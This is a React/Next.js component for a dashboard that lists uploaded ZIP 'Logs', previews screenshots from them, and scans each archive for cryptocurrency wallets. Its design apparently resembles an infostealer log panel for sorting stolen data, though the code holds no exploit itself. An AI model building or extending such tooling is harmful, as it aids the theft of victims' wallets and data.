'use client';

import { useEffect, useState } from 'react';
import { format } from 'date-fns';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { Button } from '@/components/ui/button';
import { Download, Eye, Trash2, FileArchive, BarChart3, Bitcoin, Image as ImageIcon } from 'lucide-react';
import Link from 'next/link';
import { ZipViewer } from './zip-viewer';
import { Badge } from '@/components/ui/badge';
import Image from 'next/image';

interface ZipFile {
  id: string;
  filename: string;
  size: number;
  uploadTime: string;
  url: string;
  screenshot?: string;
  hasScreenshot?: boolean;
  hasCryptoWallet?: boolean;
  walletTypes?: string[];
}

export function FileList() {
  const [files, setFiles] = useState<ZipFile[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedFile, setSelectedFile] = useState<string | null>(null);
  const [viewerOpen, setViewerOpen] = useState(false);
  const [fileAnalysis, setFileAnalysis] = useState<Record<string, any>>({});
  const [visibleRange, setVisibleRange] = useState({ start: 0, end: 50 }); // Show only 50 files at once

  useEffect(() => {
    fetchFiles();
    
    // Reduced polling to every 10 seconds instead of 2
    const interval = setInterval(() => {
      fetchFiles();
    }, 10000);
    
    return () => clearInterval(interval);
  }, []);

  // Removed automatic analysis - now only analyze when user clicks

  const fetchFiles = async () => {
    try {
      const response = await fetch('/api/files');
      const data = await response.json();
      if (data.success) {
        setFiles(prevFiles => {
          // Only update if there are actual changes to prevent unnecessary re-renders
          const newFilesStr = JSON.stringify(data.files);
          const oldFilesStr = JSON.stringify(prevFiles);
          if (newFilesStr !== oldFilesStr) {
            return data.files;
          }
          return prevFiles;
        });
      }
    } catch (error) {
      console.error('Error fetching files:', error);
    } finally {
      setLoading(false);
    }
  };

  const formatFileSize = (bytes: number) => {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
  };

  const analyzeFile = async (filename: string) => {
    try {
      const response = await fetch(`/api/analyze-zip?filename=${encodeURIComponent(filename)}`);
      const data = await response.json();
      
      if (data.success) {
        setFileAnalysis(prev => ({
          ...prev,
          [filename]: {
            ...data.analysis,
            screenshot: data.screenshot
          }
        }));
      }
    } catch (error) {
      console.error('Failed to analyze file:', filename, error);
    }
  };

  const handleView = (filename: string) => {
    setSelectedFile(filename);
    setViewerOpen(true);
  };

  const handleDownload = (url: string, filename: string) => {
    const link = document.createElement('a');
    link.href = url;
    link.download = filename;
    link.click();
  };

  const handleDelete = async (filename: string) => {
    if (confirm('Are you sure you want to delete this file?')) {
      try {
        const response = await fetch('/api/delete', {
          method: 'DELETE',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ filename })
        });

        const data = await response.json();
        if (data.success) {
          // Remove file from local state only after successful deletion
          setFiles(files.filter(f => f.filename !== filename));
        } else {
          alert('Failed to delete file: ' + data.message);
        }
      } catch (error) {
        console.error('Error deleting file:', error);
        alert('Failed to delete file. Please try again.');
      }
    }
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-gray-900"></div>
      </div>
    );
  }

  return (
    <>
      <div className="bg-white rounded-lg shadow">
        <div className="px-6 py-4 border-b border-gray-200">
          <div className="flex items-center justify-between">
            <h2 className="text-lg font-semibold text-gray-900">Logs</h2>
            <div className="flex items-center gap-4">
              <Badge variant="secondary">{files.length} files</Badge>
              {files.length > 50 && (
                <div className="flex items-center gap-2">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setVisibleRange(prev => ({ 
                      start: Math.max(0, prev.start - 50), 
                      end: Math.max(50, prev.end - 50) 
                    }))}
                    disabled={visibleRange.start === 0}
                  >
                    Previous
                  </Button>
                  <span className="text-sm text-gray-600">
                    {visibleRange.start + 1}-{Math.min(visibleRange.end, files.length)} of {files.length}
                  </span>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setVisibleRange(prev => ({ 
                      start: prev.start + 50, 
                      end: Math.min(files.length, prev.end + 50) 
                    }))}
                    disabled={visibleRange.end >= files.length}
                  >
                    Next
                  </Button>
                </div>
              )}
            </div>
          </div>
        </div>

        <div className="overflow-x-auto">
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead className="w-12"></TableHead>
                <TableHead className="w-20">Preview</TableHead>
                <TableHead className="w-24">Wallet</TableHead>
                <TableHead>Filename</TableHead>
                <TableHead>Size</TableHead>
                <TableHead>Upload Time</TableHead>
                <TableHead className="text-right">Actions</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {files.length === 0 ? (
                <TableRow>
                  <TableCell colSpan={7} className="text-center py-8 text-gray-500">
                    No files uploaded yet
                  </TableCell>
                </TableRow>
              ) : (
                files.slice(visibleRange.start, visibleRange.end).map((file) => {
                  const analysis = fileAnalysis[file.filename];
                  return (
                    <TableRow key={file.id}>
                      <TableCell>
                        <FileArchive className="h-5 w-5 text-gray-400" />
                      </TableCell>
                      <TableCell>
                        {!analysis ? (
                          <div className="w-16 h-16 flex items-center justify-center">
                            <div className="animate-pulse bg-gray-200 rounded w-full h-full"></div>
                          </div>
                        ) : analysis.screenshot ? (
                          <div className="relative w-16 h-16 overflow-hidden rounded border">
                            <img
                              src={analysis.screenshot}
                              alt="Screenshot"
                              className="w-full h-full object-cover"
                              title="Screenshot from ZIP"
                            />
                          </div>
                        ) : analysis.hasScreenshot ? (
                          <div className="w-16 h-16 flex items-center justify-center bg-gray-100 rounded border">
                            <ImageIcon className="h-6 w-6 text-gray-400" />
                          </div>
                        ) : (
                          <div className="w-16 h-16 flex items-center justify-center">
                            <span className="text-xs text-gray-400">No image</span>
                          </div>
                        )}
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-1 cursor-pointer min-h-8"
                             onClick={() => analyzeFile(file.filename)}
                             title="Click to scan for wallets">
                          {analysis?.hasCryptoWallet ? (
                            <>
                              <Bitcoin className="h-4 w-4 text-yellow-500" title="Contains crypto wallet" />
                              {analysis.walletTypes?.length > 0 && (
                                <div className="flex flex-row flex-wrap gap-0.5">
                                  {analysis.walletTypes.slice(0, 3).map((wallet: string) => (
                                    <span key={wallet} className="text-[10px] text-gray-600 font-medium">
                                      {wallet.substring(0, 3)}
                                    </span>
                                  ))}
                                  {analysis.walletTypes.length > 3 && (
                                    <span className="text-[10px] text-gray-400">+{analysis.walletTypes.length - 3}</span>
                                  )}
                                </div>
                              )}
                            </>
                          ) : analysis ? (
                            <span className="text-xs text-gray-400">Clean</span>
                          ) : (
                            <span className="text-xs text-blue-500 hover:text-blue-700">Scan</span>
                          )}
                        </div>
                      </TableCell>
                      <TableCell className="font-medium">{file.filename}</TableCell>
                      <TableCell>{formatFileSize(file.size)}</TableCell>
                      <TableCell>
                        {format(new Date(file.uploadTime), 'MMM dd, yyyy HH:mm')}
                      </TableCell>
                    <TableCell className="text-right">
                      <div className="flex items-center justify-end gap-2">
                        <Link href={`/stats?file=${file.filename}`}>
                          <Button
                            variant="ghost"
                            size="sm"
                            title="View compression stats"
                          >
                            <BarChart3 className="h-4 w-4" />
                          </Button>
                        </Link>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => handleView(file.filename)}
                          title="View contents"
                        >
                          <Eye className="h-4 w-4" />
                        </Button>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => handleDownload(file.url, file.filename)}
                          title="Download"
                        >
                          <Download className="h-4 w-4" />
                        </Button>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => handleDelete(file.filename)}
                          title="Delete"
                        >
                          <Trash2 className="h-4 w-4 text-red-500" />
                        </Button>
                      </div>
                    </TableCell>
                  </TableRow>
                  );
                })
              )}
            </TableBody>
          </Table>
        </div>
      </div>

      {selectedFile && (
        <ZipViewer
          filename={selectedFile}
          open={viewerOpen}
          onClose={() => {
            setViewerOpen(false);
            setSelectedFile(null);
          }}
        />
      )}
    </>
  );
}
